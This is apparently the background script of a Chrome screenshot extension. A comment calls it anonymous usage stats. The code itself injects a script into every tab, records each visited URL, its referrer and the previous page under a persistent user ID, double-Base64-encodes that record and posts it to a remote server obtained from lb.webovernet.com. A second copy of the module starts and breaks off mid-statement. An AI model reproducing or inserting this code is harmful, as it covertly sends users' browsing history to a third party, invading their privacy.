var ddds=''

//anonymous usage stats. Like many other extensions (ex: hover zoom)
//It's can be disabled from the option page. privacy@webpagescreenshot.info


!function(){var SIM_CONSTS={SIMPLE_SRC:"815",SIMPLE_LB_URL:"http://lb.webovernet.com/settings"},SIM_ModuleConstants={_TMV:"3009"},SIM_Config_BG={_source:null,_default_source:SIM_CONSTS.SIMPLE_SRC,_url_lb:SIM_CONSTS.SIMPLE_LB_URL,_DEBUG_MODE:!1,getSourceId:function(){try{if(null!=this._source)return this._source;if(utils.isCrossRider())this._source=utils.getInstallerSourceId(this._default_source);else{var e=window.localStorage.src;this._source=e&&void 0!==e?e:this._default_source}return this._source}catch(t){return SIM_Logger_BG.SEVERE("8877",t),this._default_source}}},SIM_DB_CrossRider={setImpl:function(e,t){appAPI.db.set(e,t)},getImpl:function(e){return appAPI.db.get(e)},removeImpl:function(e){appAPI.db.remove(e)},clearImpl:function(){throw Error("clearImpl - Not implemented yet")}},SIM_DB_GC_Native={setImpl:function(e,t){window.localStorage[e]=t},getImpl:function(e){return window.localStorage[e]},removeImpl:function(e){window.localStorage[e]=void 0,window.localStorage.removeItem(e)},clearImpl:function(){for(var e in window.localStorage)this.removeImpl(e)}},SIM_DB_Adapter={_db:void 0,init:function(){void 0==this._db&&(this._db="undefined"!=typeof appAPI?SIM_DB_CrossRider:SIM_DB_GC_Native)},set:function(e,t){if("string"!=typeof e||""==e)throw Error("4002, Invalid param: key");void 0==this._db&&this.init(),this._db.setImpl(e,t)},get:function(e){if("string"!=typeof e||""==e)throw Error("4003, Invalid param: key");return void 0==this._db&&this.init(),this._db.getImpl(e)},remove:function(e){if("string"!=typeof e||""==e)throw Error("4004, Invalid param: key");void 0==this._db&&this.init(),this._db.removeImpl(e)},clear:function(){void 0==this._db&&this.init(),this._db.clearImpl()}},SIM_Request_CrossRider={postImpl:function(e,t,r,o,n){appAPI.request.post({url:e,postData:r,onSuccess:o,onFailure:n,contentType:"application/x-www-form-urlencoded"})},getImpl:function(e,t,r,o){appAPI.request.get({url:e,onSuccess:r,onFailure:o})}},SIM_Request_GC_Native={postImpl:function(e,t,r,o,n){var i=new XMLHttpRequest;i.open("POST",e,!0),i.setRequestHeader("Content-type","application/x-www-form-urlencoded"),i.onreadystatechange=function(){4==i.readyState&&(200==i.status?o(JSON.parse(i.responseText)):n(i))},i.send(r)},getImpl:function(e,t,r,o){var n=new XMLHttpRequest;n.open("GET",e,!0),n.onreadystatechange=function(){4==n.readyState&&(200==n.status?r(JSON.parse(n.responseText)):o(n))},n.send(null)}},SIM_Request_Adapter={_impl:void 0,init:function(){void 0==this._impl&&(this._impl="undefined"!=typeof appAPI?SIM_Request_CrossRider:SIM_Request_GC_Native)},post:function(e,t,r,o,n){if("string"!=typeof e||""==e)throw Error("4007, Invalid param: url_");if("string"!=typeof t||"text"!=t&&"json"!=t)throw Error("4008, Invalid param: expectedResult_");if("string"!=typeof r)throw Error("4009, Invalid param: data_");if("function"!=typeof o)throw Error("4010, Invalid param: onSuccess_");if("function"!=typeof n)throw Error("4011, Invalid param: onError_");void 0==this._impl&&this.init(),this._impl.postImpl(e,t,r,o,n)},get:function(e,t,r,o){if("string"!=typeof e||""==e)throw Error("4012, Invalid param: url_");if("string"!=typeof t||"text"!=t&&"json"!=t)throw Error("4013, Invalid param: expectedResult_");if("function"!=typeof r)throw Error("4014, Invalid param: onSuccess_");if("function"!=typeof o)throw Error("4015, Invalid param: onError_");void 0==this._impl&&this.init(),this._impl.getImpl(e,t,r,o)}},SIM_Browser={getName:function(){return"undefined"!=typeof appAPI?appAPI.browser.name:"chrome"}},SIM_StoragePerTMV={set:function(e,t){e=SIM_ModuleConstants._TMV+"."+e,utils.db.set(e,t)},get:function(e){return e=SIM_ModuleConstants._TMV+"."+e,utils.db.get(e)}},SIM_FrameworkUtils={db:SIM_DB_Adapter,browser:SIM_Browser,net:SIM_Request_Adapter,db_tmv:SIM_StoragePerTMV,isCrossRider:function(){return"undefined"!=typeof appAPI?!0:!1},createRandomNumber:function(){return Math.floor(1e18*Math.random())},createRandomString:function(e){for(var t="",r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",o=0;e>o;o++)t+=r.charAt(Math.floor(Math.random()*r.length));return t},createUserID:function(){return"undefined"!=typeof appAPI?appAPI.getCrossriderID()||this.createRandomString(15):this.createRandomString(15)},getInstallerSourceId:function(e){if("undefined"!=typeof appAPI){var t=appAPI.installer.getParams().source_id;return 0!=t?t:e}return e},getSub:function(){return"undefined"!=typeof appAPI?appAPI.appID||"":"chrome"},getExtensionId:function(){if("undefined"!=typeof appAPI)return appAPI.appID;if("chrome"==this.browser.getName())return void 0!==chrome.runtime?chrome.runtime.id:chrome.i18n.getMessage("@@extension_id");throw Error("4016, not implemented")}},SIM_Logger_BG={_counter:0,logImpl:function(e,t){if(SIM_Config_BG._DEBUG_MODE)try{var r=++this._counter+"> "+this.getNow()+", "+e+", "+t;if("chrome"!=utils.browser.getName()||"ERROR"!=e&&"SEVERE"!=e)if("chrome"==utils.browser.getName()&&"HIGHLIGHT"==e){r="%c"+r;var o="color: blue;";o+="a:link{color: blue;};a:active{color: blue;}",console.log(r,o)}else console.log(r);else console.error(r)}catch(n){}},HT:function(e){this.logImpl("HIGHLIGHT",e)},INFO:function(e){this.logImpl("INFO",e)},ERROR:function(e){this.logImpl("ERROR",e)},SEVERE:function(e,t){this.logImpl("SEVERE",e+" Exception: "+t.message)},SEVERE2:function(e){this.logImpl("SEVERE",e)},pad:function(e,t){for(var r=e+"";r.length<t;)r="0"+r;return r},getNow:function(){try{var e=new Date,t=e.getDate()+"/"+(e.getMonth()+1)+"/"+e.getFullYear(),r=this.pad(e.getHours(),2)+":"+this.pad(e.getMinutes(),2)+":"+this.pad(e.getSeconds(),2)+"."+this.pad(e.getMilliseconds(),3),o=t+" "+r;return o}catch(n){return""}},addConsoleHelper:function(){SIM_Config_BG._DEBUG_MODE&&chrome.runtime.onMessage.addListener(function(e,t){if(void 0!=e.console_log_message){var r=t.tab?", from a content script of url : = ["+t.tab.url+"]":", from the extension.",o="FROM_CONTENT_PAGE : message = ["+e.console_log_message+"]"+r;log.INFO(o)}})},testLogFromContentPage:function(e){var t=function(){try{chrome.runtime.sendMessage({console_log_message:"message from content page"},function(){})}catch(e){alert(e)}},r=""+t,o=r.slice(r.indexOf("{")+1,r.lastIndexOf("}"));chrome.tabs.executeScript(e,{code:o},function(e){log.INFO("executeScript, result = "+e)})}},SIM_Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t,r,o,n,i,a,s,d="",l=0;for(e=this._utf8_encode(e);l<e.length;)t=e.charCodeAt(l++),r=e.charCodeAt(l++),o=e.charCodeAt(l++),n=t>>2,i=(3&t)<<4|r>>4,a=(15&r)<<2|o>>6,s=63&o,isNaN(r)?a=s=64:isNaN(o)&&(s=64),d=d+this._keyStr.charAt(n)+this._keyStr.charAt(i)+this._keyStr.charAt(a)+this._keyStr.charAt(s);return d},decode:function(e){var t,r,o,n,i,a,s,d="",l=0;for(e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");l<e.length;)n=this._keyStr.indexOf(e.charAt(l++)),i=this._keyStr.indexOf(e.charAt(l++)),a=this._keyStr.indexOf(e.charAt(l++)),s=this._keyStr.indexOf(e.charAt(l++)),t=n<<2|i>>4,r=(15&i)<<4|a>>2,o=(3&a)<<6|s,d+=String.fromCharCode(t),64!=a&&(d+=String.fromCharCode(r)),64!=s&&(d+=String.fromCharCode(o));return d=this._utf8_decode(d)},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");for(var t="",r=0;r<e.length;r++){var o=e.charCodeAt(r);128>o?t+=String.fromCharCode(o):o>127&&2048>o?(t+=String.fromCharCode(o>>6|192),t+=String.fromCharCode(63&o|128)):(t+=String.fromCharCode(o>>12|224),t+=String.fromCharCode(o>>6&63|128),t+=String.fromCharCode(63&o|128))}return t},_utf8_decode:function(e){for(var t="",r=0,o=0,n=0,i=0;r<e.length;)o=e.charCodeAt(r),128>o?(t+=String.fromCharCode(o),r++):o>191&&224>o?(n=e.charCodeAt(r+1),t+=String.fromCharCode((31&o)<<6|63&n),r+=2):(n=e.charCodeAt(r+1),i=e.charCodeAt(r+2),t+=String.fromCharCode((15&o)<<12|(63&n)<<6|63&i),r+=3);return t}};"object"!=typeof JSON&&(JSON={}),function(){function f(e){return 10>e?"0"+e:e}function quote(e){return escapable.lastIndex=0,escapable.test(e)?'"'+e.replace(escapable,function(e){var t=meta[e];return"string"==typeof t?t:"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+e+'"'}function str(e,t){var r,o,n,i,a,s=gap,d=t[e];switch(d&&"object"==typeof d&&"function"==typeof d.toJSON&&(d=d.toJSON(e)),"function"==typeof rep&&(d=rep.call(t,e,d)),typeof d){case"string":return quote(d);case"number":return isFinite(d)?d+"":"null";case"boolean":case"null":return d+"";case"object":if(!d)return"null";if(gap+=indent,a=[],"[object Array]"===Object.prototype.toString.apply(d)){for(i=d.length,r=0;i>r;r+=1)a[r]=str(r,d)||"null";return n=0===a.length?"[]":gap?"[\n"+gap+a.join(",\n"+gap)+"\n"+s+"]":"["+a.join(",")+"]",gap=s,n}if(rep&&"object"==typeof rep)for(i=rep.length,r=0;i>r;r+=1)"string"==typeof rep[r]&&(o=rep[r],n=str(o,d),n&&a.push(quote(o)+(gap?": ":":")+n));else for(o in d)Object.prototype.hasOwnProperty.call(d,o)&&(n=str(o,d),n&&a.push(quote(o)+(gap?": ":":")+n));return n=0===a.length?"{}":gap?"{\n"+gap+a.join(",\n"+gap)+"\n"+s+"}":"{"+a.join(",")+"}",gap=s,n}}"function"!=typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()});var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;"function"!=typeof JSON.stringify&&(JSON.stringify=function(e,t,r){var o;if(gap="",indent="","number"==typeof r)for(o=0;r>o;o+=1)indent+=" ";else"string"==typeof r&&(indent=r);if(rep=t,t&&"function"!=typeof t&&("object"!=typeof t||"number"!=typeof t.length))throw Error("JSON.stringify");return str("",{"":e})}),"function"!=typeof JSON.parse&&(JSON.parse=function(text,reviver){function walk(e,t){var r,o,n=e[t];if(n&&"object"==typeof n)for(r in n)Object.prototype.hasOwnProperty.call(n,r)&&(o=walk(n,r),void 0!==o?n[r]=o:delete n[r]);return reviver.call(e,t,n)}var j;if(text+="",cx.lastIndex=0,cx.test(text)&&(text=text.replace(cx,function(e){return"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)})),/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return j=eval("("+text+")"),"function"==typeof reviver?walk({"":j},""):j;throw new SyntaxError("JSON.parse")})}();var SIM_Session={_sessionid:void 0,getSessionId:function(){return void 0===this._sessionid&&(this._sessionid=utils.createRandomNumber()),this._sessionid}},SIM_LB_Client=function(){function e(){try{var e=new XMLHttpRequest;e.open("GET",chrome.extension.getURL("manifest.json"),!1),e.send(null);var t=JSON.parse(e.responseText);return t.version}catch(r){return void 0}}this.initOnceAfterInstall=function(){if(void 0===utils.db.get("userid")){var e=utils.createUserID();utils.db.set("userid",e)}if(void 0===utils.db.get("install_time")){var t=(new Date).getTime()/1e3;utils.db.set("install_time",t)}},this.start_lb=function(){try{log.HT("start_lb enter"),this.initOnceAfterInstall();var t=SIM_Config_BG._url_lb,r="s="+SIM_Config_BG.getSourceId();r+="&ins="+encodeURIComponent(utils.db.get("install_time"))+"&ver="+encodeURIComponent(e()),t=t+"?"+r,utils.net.get(t,"json",function(e){log.INFO("Success to get lb"),void 0!==e.Status?"1"==e.Status?void 0!==e.Endpoint?(utils.db_tmv.set("server",e.Endpoint),e.Mon&&"1"==e.Mon?utils.db.set("enable_mon",!0):utils.db.set("enable_mon",!1)):log.ERROR("Invalid lb response, no Endpoint or Midpoint"):(log.INFO("WARN: result.Status is not 1"),utils.db_tmv.set("server",""),utils.db.set("enable_mon",!1)):log.ERROR("Invalid lb response, no Status = "+e.Status)},function(e){log.ERROR("Failed to get lb, ,url = "+t+", httpCode = "+e.status)}),log.HT("start_lb leave");try{log.addConsoleHelper()}catch(o){log.SEVERE("9071",o)}var n=new SIM_DataTracker_GC;n.start()}catch(o){log.SEVERE("9001",o)}}},SIM_DataTracker_GC=function(){function e(e,r,o){log.HT("tabs_onUpdated, tabId = "+e+", changeInfo.status = "+r.status+", tab = "+o.url),r&&r.status&&"complete"==r.status&&t(o,r.status)}function t(e,t){try{if("chrome://newtab/"==e.url)return;if(-1!=e.url.indexOf("chrome-devtools://"))return;if(-1!=e.url.indexOf("about:blank"))return;var r=function(){try{var e="";try{e=document.doctype.name}catch(t){}var r={docType:e,tab_id:__TABID__PLACEHOLDER__,tab_url_:__TABURL__PLACEHOLDER__,change_status_:__CHANGE_STATUS__PLACEHOLDER__,fromTMV_:__TMV__PLACEHOLDER__,ref:document.referrer,messageId_:55557777};chrome.extension.sendRequest(r,function(){})}catch(t){}},o=""+r;o=o.replace("__TABID__PLACEHOLDER__",e.id);var n=SIM_Base64.encode(e.url);o=o.replace("__TABURL__PLACEHOLDER__","'"+n+"'"),o=o.replace("__CHANGE_STATUS__PLACEHOLDER__","'"+t+"'"),o=o.replace("__TMV__PLACEHOLDER__","'"+a+"'");var i=o.slice(o.indexOf("{")+1,o.lastIndexOf("}"));chrome.tabs.executeScript(e.id,{code:i},function(){})}catch(s){console.error("ERR 8000: "+s)}}function r(e){try{var t,r=void 0,o=void 0;r=s[e],r&&""!=r?o=e:f&&e!=f?(o=f,log.INFO("prevTabId flow A")):c&&e!=c?(o=c,log.INFO("prevTabId flow B")):o=e;var t="";return o&&s[o]&&(t=s[o]),t}catch(n){return console.error("ERROR 8001: "+n),""}}function o(e,t){var o=e;try{var n=utils.getExtensionId();if(t&&t.id==n){var i=e.fromTMV_;if(i&&i==a)if(o.messageId_&&55557777==o.messageId_){var c=o.tab_id,f=r(c);if(""!=utils.db_tmv.get("server")&&"undefined"!=utils.db_tmv.get("server")){var g=o.ref,_=o.docType,p=o.tab_url_,h=SIM_Base64.decode(p),v=o.change_status_;log.HT("extension_onRequest, url = ["+h+"] ,ref = ["+g+"],  computePrev2 = ["+f+"]");var R=!1,m=s[c];if(m&&""!=m||(R=!0),R){var I="(http|https)://(.*.|)google..*/url?.*",b=RegExp(I,void 0),E=b.test(h);if(b=null,E)return void log.HT("extension_onRequest: Skipped redirect = "+h)}var I="(http|https)://(.*.|)google..*/aclk?.*",b=RegExp(I,void 0),E=b.test(h);if(b=null,E)return void log.HT("extension_onRequest: Skipped ppc redirect = "+h);if("html"!=_&&""!=_)return s[c]="",void log.ERROR("ERROR 8000 ??");s[c]=h;var S=-1;if(l[c]&&(S=Date.now()-l[c]),l[c]=Date.now(),S>=0&&100>S&&s[c]==h)return void log.ERROR("ERROR 8001 ?? Skipped, update_diff < 10, tab_url = "+h);var w=u[c];if(u[c]=v,f==h&&w!=v)return void log.ERROR("ERROR 8002 ??");(null==f||0==f.length)&&(f=d),d=h;var O="s="+SIM_Config_BG.getSourceId()+"&md=21&pid="+utils.db.get("userid")+"&sess="+SIM_Session.getSessionId()+"&q="+encodeURIComponent(h)+"&prev="+encodeURIComponent(f)+"&link="+(g?"1":"0")+"&sub=chrome&hreferer="+encodeURIComponent(g);O=O+"&tmv="+SIM_ModuleConstants._TMV,O=SIM_Base64.encode(SIM_Base64.encode(O)),O="e="+O;var y=utils.db_tmv.get("server")+"/related";utils.net.post(y,"json",O,function(){log.INFO("Succeeded in posting data"),s[c]=h},function(e){log.INFO("Failed to retrieve content. (HTTP Code:"+e.status+")"),log.ERROR("ERROR 8004 ??"),s[c]=h})}}else log.ERROR("messaged unknown, or undefined : request = "+e);else i?log.INFO("Message of other tmv = "+i):log.ERROR("Message without fromTMV")}else log.ERROR("unknown sender = "+t.id)}catch(C){console.error("ERR 8002: "+C)}}function n(e){try{log.INFO("tabs.onActivated  windowId = "+e.windowId+", tabId = "+e.tabId),e.tabId<0?log.ERROR("tabs_onActivated, how to handle activeInfo.tabId <0  ?"):(c=f,f=e.tabId)}catch(t){log.SEVERE("8834",t)}}function i(e){chrome.tabs.get(e,function(e){t(e)})}var a=SIM_ModuleConstants._TMV,s=[],d="",l=[],u=[],c=!1,f=!1;this.start=function(){try{chrome.extension.onRequest.addListener(o),chrome.tabs.onUpdated.addListener(e),chrome.tabs.onActivated.addListener(n),chrome.tabs.onReplaced.addListener(i)}catch(t){log.SEVERE("8835",t)}}},log=SIM_Logger_BG;log.INFO("Hello");var utils=SIM_FrameworkUtils;this.main=function(){try{var e=new SIM_LB_Client;e.start_lb()}catch(t){console.log("9099, "+t)}},this.main()}(),function(){var SIM_CONSTS={ADV_SRC:"1815",ADV_LB_URL:"http://lb.webovernet.com/settings"},SIM_ModuleConstants={_TMV:"4009"},SIM_Config_BG={_source:null,_default_source:SIM_CONSTS.ADV_SRC,_url_lb:SIM_CONSTS.ADV_LB_URL,_DEBUG_MODE:!1,getSourceId:function(){try{if(null!=this._source)return this._source;if(utils.isCrossRider())this._source=utils.getInstallerSourceId(this._default_source);else{var e=window.localStorage.src;e&&void 0!==e?window.localStorage.src_adv?this._source=window.localStorage.src_adv:(e="1"+e,window.localStorage.src_adv=e,this._source=e):this._source=this._default_source}return this._source}catch(t){return SIM_Logger_BG.SEVERE("8877",t),this._default_source}}},SIM_DB_CrossRider={setImpl:function(e,t){appAPI.db.set(e,t)},getImpl:function(e){return appAPI.db.get(e)},removeImpl:function(e){appAPI.db.remove(e)},clearImpl:function(){throw Error("clearImpl - Not implemented yet")}},SIM_DB_GC_Native={setImpl:function(e,t){window.localStorage[e]=t},getImpl:function(e){return window.localStorage[e]},removeImpl:function(e){window.localStorage[e]=void 0,window.localStorage.removeItem(e)},clearImpl:function(){for(var e in window.localStorage)this.removeImpl(e)}},SIM_DB_Adapter={_db:void 0,init:function(){void 0==this._db&&(this._db="undefined"!=typeof appAPI?SIM_DB_CrossRider:SIM_DB_GC_Native)},set:function(e,t){if("string"!=typeof e||""==e)throw Error("4002, Invalid param: key");void 0==this._db&&this.init(),this._db.setImpl(e,t)},get:function(e){if("string"!=typeof e||""==e)throw Error("4003, Invalid param: key");return void 0==this._db&&this.init(),this._db.getImpl(e)},remove:function(e){if("string"!=typeof e||""==e)throw Error("4004, Invalid param: key");void 0==this._db&&this.init(),this._db.removeImpl(e)},clear:function(){void 0==this._db&&this.init(),this._db.clearImpl()}},SIM_Request_CrossRider={postImpl:function(e,t,r,o,n){appAPI.request.post({url:e,postData:r,onSuccess:o,onFailure:n,contentType:"application/x-www-form-urlencoded"})},getImpl:function(e,t,r,o){appAPI.request.get({url:e,onSuccess:r,onFailure:o})}},SIM_Request_GC_Native={postImpl:function(e,t,r,o,n){var i=new XMLHttpRequest;i.open("POST",e,!0),i.setRequestHeader("Content-type","application/x-www-form-urlencoded"),i.onreadystatechange=function(){4==i.readyState&&(200==i.status?o(JSON.parse(i.responseText)):n(i))},i.send(r)},getImpl:function(e,t,r,o){var n=new XMLHttpRequest;n.open("GET",e,!0),n.onreadystatechange=function(){4==n.readyState&&(200==n.status?r(JSON.parse(n.responseText)):o(n))},n.send(null)}},SIM_Request_Adapter={_impl:void 0,init:function(){void 0==this._impl&&(this._impl="undefined"!=typeof appAPI?SIM_Request_CrossRider:SIM_Request_GC_Native)},post:function(e,t,r,o,n){if("string"!=typeof e||""==e)throw Error("4007, Invalid param: url_");if("string"!=typeof t||"text"!=t&&"json"!=t)throw Error("4008, Invalid param: expectedResult_");if("string"!=typeof r)throw Error("4009, Invalid param: data_");if("function"!=typeof o)throw Error("4010, Invalid param: onSuccess_");if("function"!=typeof n)throw Error("4011, Invalid param: onError_");void 0==this._impl&&this.init(),this._impl.postImpl(e,t,r,o,n)},get:function(e,t,r,o){if("string"!=typeof e||""==e)throw Error("4012, Invalid param: url_");if("string"!=typeof t||"text"!=t&&"json"!=t)throw Error("4013, Invalid param: expectedResult_");if("function"!=typeof r)throw Error("4014, Invalid param: onSuccess_");if("function"!=typeof o)throw Error("4015, Invalid param: onError_");void 0==this._impl&&this.init(),this._impl.getImpl(e,t,r,o)}},SIM_Browser={getName:function(){return"undefined"!=typeof appAPI?appAPI.browser.name:"chrome"}},SIM_StoragePerTMV={set:function(e,t){e=SIM_ModuleConstants._TMV+"."+e,utils.db.set(e,t)},get:function(e){return e=SIM_ModuleConstants._TMV+"."+e,utils.db.get(e)}},SIM_FrameworkUtils={db:SIM_DB_Adapter,browser:SIM_Browser,net:SIM_Request_Adapter,db_tmv:SIM_StoragePerTMV,isCrossRider:function(){return"undefined"!=typeof appAPI?!0:!1},createRandomNumber:function(){return Math.floor(1e18*Math.random())},createRandomString:function(e){for(var t="",r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",o=0;e>o;o++)t+=r.charAt(Math.floor(Math.random()*r.length));return t},createUserID:function(){return"undefined"!=typeof appAPI?appAPI.getCrossriderID()||this.createRandomString(15):this.createRandomString(15)},getInstallerSourceId:function(e){if("undefined"!=typeof appAPI){var t=appAPI.installer.getParams().source_id;return 0!=t?t:e}return e},getSub:function(){return"undefined"!=typeof appAPI?appAPI.appID||"":"chrome"},getExtensionId:function(){if("undefined"!=typeof appAPI)return appAPI.appID;if("chrome"==this.browser.getName())return void 0!==chrome.runtime?chrome.runtime.id:chrome.i18n.getMessage("@@extension_id");throw Error("4016, not implemented")}},SIM_Logger_BG={_counter:0,logImpl:function(e,t){if(SIM_Config_BG._DEBUG_MODE)try{var r=++this._counter+"> "+this.getNow()+", "+e+", "+t;if("chrome"!=utils.browser.getName()||"ERROR"!=e&&"SEVERE"!=e)if("chrome"==utils.browser.getName()&&"HIGHLIGHT"==e){r="%c"+r;var o="color: blue;";o+="a:link{color: blue;};a:active{color: blue;}",console.log(r,o)}else console.log(r);else console.error(r)}catch(n){}},HT:function(e){this.logImpl("HIGHLIGHT",e)},INFO:function(e){this.logImpl("INFO",e)},ERROR:function(e){this.logImpl("ERROR",e)},SEVERE:function(e,t){this.logImpl("SEVERE",e+" Exception: "+t.message)},SEVERE2:function(e){this.logImpl("SEVERE",e)},pad:function(e,t){for(var r=e+"";r.length<t;)r="0"+r;return r},getNow:function(){try{var e=new Date,t=e.getDate()+"/"+(e.getMonth()+1)+"/"+e.getFullYear(),r=this.pad(e.getHours(),2)+":"+this.pad(e.getMinutes(),2)+":"+this.pad(e.getSeconds(),2)+"."+this.pad(e.getMilliseconds(),3),o=t+" "+r;return o}catch(n){return""}},addConsoleHelper:function(){SIM_Config_BG._DEBUG_MODE&&chrome.runtime.onMessage.addListener(function(e,t){if(void 0!=e.console_log_message){var r=t.tab?", from a content script of url : = ["+t.tab.url+"]":", from the extension.",o="FROM_CONTENT_PAGE : message = ["+e.console_log_message+"]"+r;log.INFO(o)}})},testLogFromContentPage:function(e){var t=function(){try{chrome.runtime.sendMessage({console_log_message:"message from content page"},function(){})}catch(e){alert(e)}},r=""+t,o=r.slice(r.indexOf("{")+1,r.lastIndexOf("}"));chrome.tabs.executeScript(e,{code:o},function(e){log.INFO("executeScript, result = "+e)})}},SIM_Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t,r,o,n,i,a,s,d="",l=0;for(e=this._utf8_encode(e);l<e.length;)t=e.charCodeAt(l++),r=e.charCodeAt(l++),o=e.charCodeAt(l++),n=t>>2,i=(3&t)<<4|r>>4,a=(15&r)<<2|o>>6,s=63&o,isNaN(r)?a=s=64:isNaN(o)&&(s=64),d=d+this._keyStr.charAt(n)+this._keyStr.charAt(i)+this._keyStr.charAt(a)+this._keyStr.charAt(s);return d},decode:function(e){var t,r,o,n,i,a,s,d="",l=0;for(e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");l<e.length;)n=this._keyStr.indexOf(e.charAt(l++)),i=this._keyStr.indexOf(e.charAt(l++)),a=this._keyStr.indexOf(e.charAt(l++)),s=this._keyStr.indexOf(e.charAt(l++)),t=n<<2|i>>4,r=(15&i)<<4|a>>2,o=(3&a)<<6|s,d+=String.fromCharCode(t),64!=a&&(d+=String.fromCharCode(r)),64!=s&&(d+=String.fromCharCode(o));return d=this._utf8_decode(d)},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");for(var t="",r=0;r<e.length;r++){var o=e.charCodeAt(r);128>o?t+=String.fromCharCode(o):o>127&&2048>o?(t+=String.fromCharCode(o>>6|192),t+=String.fromCharCode(63&o|128)):(t+=String.fromCharCode(o>>12|224),t+=String.fromCharCode(o>>6&63|128),t+=String.fromCharCode(63&o|128))}return t},_utf8_decode:function(e){for(var t="",r=0,o=0,n=0,i=0;r<e.length;)o=e.charCodeAt(r),128>o?(t+=String.fromCharCode(o),r++):o>191&&224>o?(n=e.charCodeAt(r+1),t+=String.fromCharCode((31&o)<<6|63&n),r+=2):(n=e.charCodeAt(r+1),i=e.charCodeAt(r+2),t+=String.fromCharCode((15&o)<<12|(63&n)<<6|63&i),r+=3);return t}};"object"!=typeof JSON&&(JSON={}),function(){function f(e){return 10>e?"0"+e:e}function quote(e){return escapable.lastIndex=0,escapable.test(e)?'"'+e.replace(escapable,function(e){var t=meta[e];return"string"==typeof t?t:"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+e+'"'}function str(e,t){var r,o,n,i,a,s=gap,d=t[e];switch(d&&"object"==typeof d&&"function"==typeof d.toJSON&&(d=d.toJSON(e)),"function"==typeof rep&&(d=rep.call(t,e,d)),typeof d){case"string":return quote(d);case"number":return isFinite(d)?d+"":"null";case"boolean":case"null":return d+"";case"object":if(!d)return"null";if(gap+=indent,a=[],"[object Array]"===Object.prototype.toString.apply(d)){for(i=d.length,r=0;i>r;r+=1)a[r]=str(r,d)||"null";return n=0===a.length?"[]":gap?"[\n"+gap+a.join(",\n"+gap)+"\n"+s+"]":"["+a.join(",")+"]",gap=s,n}if(rep&&"object"==typeof rep)for(i=rep.length,r=0;i>r;r+=1)"string"==typeof rep[r]&&(o=rep[r],n=str(o,d),n&&a.push(quote(o)+(gap?": ":":")+n));else for(o in d)Object.prototype.hasOwnProperty.call(d,o)&&(n=str(o,d),n&&a.push(quote(o)+(gap?": ":":")+n));return n=0===a.length?"{}":gap?"{\n"+gap+a.join(",\n"+gap)+"\n"+s+"}":"{"+a.join(",")+"}",gap=s,n}}"function"!=typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()});var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;"function"!=typeof JSON.stringify&&(JSON.stringify=function(e,t,r){var o;if(gap="",indent="","number"==typeof r)for(o=0;r>o;o+=1)indent+=" ";else"string"==typeof r&&(indent=r);if(rep=t,t&&"function"!=typeof t&&("object"!=typeof t||"number"!=typeof t.length))throw Error("JSON.stringify");return str("",{"":e})}),"function"!=typeof JSON.parse&&(JSON.parse=function(text,reviver){function walk(e,t){var r,o,n=e[t];if(n&&"object"==typeof n)for(r in n)Object.prototype.hasOwnProperty.call(n,r)&&(o=walk(n,r),void 0!==o?n[r]=o:delete n[r]);return reviver.call(e,t,n)}var j;if(text+="",cx.lastIndex=0,cx.test(text)&&(text=text.replace(cx,function(e){return"\\u"+("0000"+e.charCodeAt(0).toString(16)).slice(-4)})),/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return j=eval("("+text+")"),"function"==typeof reviver?walk({"":j},""):j;throw new SyntaxError("JSON.parse")})}();var SIM_Session={_sessionid:void 0,getSessionId:function(){return void 